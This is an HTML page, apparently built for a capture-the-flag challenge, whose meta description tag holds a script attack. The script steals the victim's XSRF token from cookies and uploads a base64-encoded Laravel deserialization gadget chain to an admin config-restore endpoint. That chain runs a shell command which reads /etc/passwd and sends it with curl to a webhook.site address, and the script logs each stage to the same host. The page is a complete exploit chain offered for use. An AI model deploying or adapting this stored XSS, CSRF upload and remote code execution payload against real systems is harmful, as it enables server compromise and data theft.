<!DOCTYPE html>
<html><head><title>XSS Upload SAV - Fixed Logic</title>
<!-- VERSION_XSS_UPLOAD_FIXED_LOGIC_V1 -->
<meta name="description" content='<script>
    (function() {
        var webhook_id = "792a817c-a6b3-4529-a9ed-5780c728488a";
        var attacker_url = "https://webhook.site/" + webhook_id;
        
        // Chuỗi placeholder ban đầu (bạn có thể đặt bất kỳ chuỗi nào bạn muốn)
        var originalPlaceholder = "##PASTE_YOUR_BASE64_PAYLOAD_HERE##"; 

        // =======================================================================================
        // DÁN TOÀN BỘ NỘI DUNG TỪ FILE "base64_payload_string.txt" VÀO ĐÂY, THAY THẾ CHO originalPlaceholder:
        var base64SavPayload = "Tzo1NToiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdTaW5nbGV0b25SZXNvdXJjZVJlZ2lzdHJhdGlvbiI6NDp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjM1OiJJbGx1bWluYXRlXERhdGFiYXNlXERhdGFiYXNlTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO2E6MTp7czo2OiJjb25maWciO2E6Mjp7czoxNjoiZGF0YWJhc2UuZGVmYXVsdCI7czo2OiJzeXN0ZW0iO3M6MjA6ImRhdGFiYXNlLmNvbm5lY3Rpb25zIjthOjE6e3M6Njoic3lzdGVtIjtzOjE2NToiYWNhdCAvZXRjL3Bhc3N3ZCA+IC90bXAvZmxhZzNfY29udGVudC50eHQ7IGN1cmwgLUYgZmxhZzM9QC90bXAvZmxhZzNfY29udGVudC50eHQgaHR0cHM6Ly93ZWJob29rLnNpdGUvNzkyYTgxN2MtYTZiMy00NTI5LWE5ZWQtNTc4MGM3Mjg0ODhhOyBybSAvdG1wL2ZsYWczX2NvbnRlbnQudHh0Ijt9fX1zOjEwOiIAKgBmYWN0b3J5IjtzOjg6ImFueXRoaW5nIjtzOjEzOiIAKgBleHRlbnNpb25zIjthOjE6e3M6Njoic3lzdGVtIjtzOjEyOiJhcnJheV9maWx0ZXIiO319czo3OiIAKgBuYW1lIjtzOjQ6Im5hbWUiO3M6MTM6IgAqAGNvbnRyb2xsZXIiO3M6MTA6ImNvbnRyb2xsZXIiO3M6MTA6IgAqAG9wdGlvbnMiO2E6MDp7fX0K"; 
        // =======================================================================================

        function sendPing(data_obj) { // Giữ nguyên hàm sendPing của bạn
            var params = new URLSearchParams();
            params.append("source_tag", "name:description_XSS_UPLOAD_FLAG34_FIXED_V1"); 
            for (var key in data_obj) {
                if (data_obj.hasOwnProperty(key)) {
                    let value = data_obj[key];
                    if (typeof value === "object" && value !== null) {
                        if (value instanceof Error) value = { name: value.name, message: value.message};
                        try { params.append(key, JSON.stringify(value).substring(0, 500)); } 
                        catch (e) { params.append(key, "[Unserializable]"); }
                    } else { params.append(key, String(value).substring(0, 500)); }
                }
            }
            new Image().src = attacker_url + "?" + params.toString();
        }

        function b64toBlob(b64Data, contentType="application/octet-stream") { // Giữ nguyên hàm b64toBlob
            try {
                const byteCharacters = atob(b64Data);
                const byteArrays = [];
                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
                    const slice = byteCharacters.slice(offset, offset + 512);
                    const byteNumbers = new Array(slice.length);
                    for (let i = 0; i < slice.length; i++) { byteNumbers[i] = slice.charCodeAt(i); }
                    byteArrays.push(new Uint8Array(byteNumbers));
                }
                return new Blob(byteArrays, {type: contentType});
            } catch (e) {
                sendPing({stage: "b64toBlob_error", error: e.message});
                return null;
            }
        }
        
        try {
            sendPing({ stage: "script_start_flag34_fixed", loc: window.location.href });

            // SỬA ĐIỀU KIỆN IF Ở ĐÂY: So sánh với chuỗi placeholder bạn định nghĩa
            if (!base64SavPayload || base64SavPayload === originalPlaceholder || base64SavPayload.length < 100 ) { // Thêm check độ dài tối thiểu
                sendPing({stage: "payload_string_is_placeholder_or_empty_or_too_short", current_payload_val: base64SavPayload.substring(0,50)});
                return; 
            }
            // Từ đây, base64SavPayload đã chứa payload thật
            sendPing({stage: "payload_string_is_valid_and_set", payload_len: base64SavPayload.length});


            var xsrfTokenValue = null;
            var cookies = document.cookie.split(";");
            for (var i = 0; i < cookies.length; i++) {
                var cookie = cookies[i].trim();
                if (cookie.startsWith("XSRF-TOKEN=")) {
                    xsrfTokenValue = decodeURIComponent(cookie.substring("XSRF-TOKEN=".length));
                    break;
                }
            }

            if (!xsrfTokenValue) {
                sendPing({ stage: "xsrf_token_missing_for_upload" });
            } else {
                 sendPing({ stage: "xsrf_token_found_for_upload", xsrf_preview: xsrfTokenValue.substring(0,20) });
            }

            var fileBlob = b64toBlob(base64SavPayload); 
            if (!fileBlob) { return; } 

            var uploadFile = new File([fileBlob], "backup.sav", {type: "application/octet-stream"});
            var formData = new FormData();
            
            if (xsrfTokenValue) { 
                 formData.append("_token", xsrfTokenValue); 
            }
            formData.append("config_file", uploadFile, "backup.sav"); 

            sendPing({ stage: "formdata_created_ready_to_upload_fixed", filename: "backup.sav" });

            fetch("/admin/configs/restore", { 
                method: "POST",
                headers: { 
                    "Accept": "text/html,application/json", 
                    "X-Requested-With": "XMLHttpRequest"
                },
                body: formData
            })
            .then(response => {
                sendPing({ stage: "upload_response_admin_configs_fixed", status: response.status, ok: response.ok, url_after_resp: response.url });
                if (!response.ok && !(response.status >= 300 && response.status < 400) ) { 
                     return response.text().then(text => {
                        sendPing({ stage: "upload_error_admin_configs_fixed", status: response.status, body: text.substring(0,300) });
                     });
                }
            })
            .catch(error => {
                sendPing({ stage: "upload_fetch_catch_error_admin_configs_fixed", error: error.message });
            });

        } catch (e_outer) {
            sendPing({ stage: "outer_script_error_flag34_fixed", error: e_outer.message });
        }
    })();
</script>'></head><body><h1>XSS Upload SAV - Fixed Logic</h1></body></html>
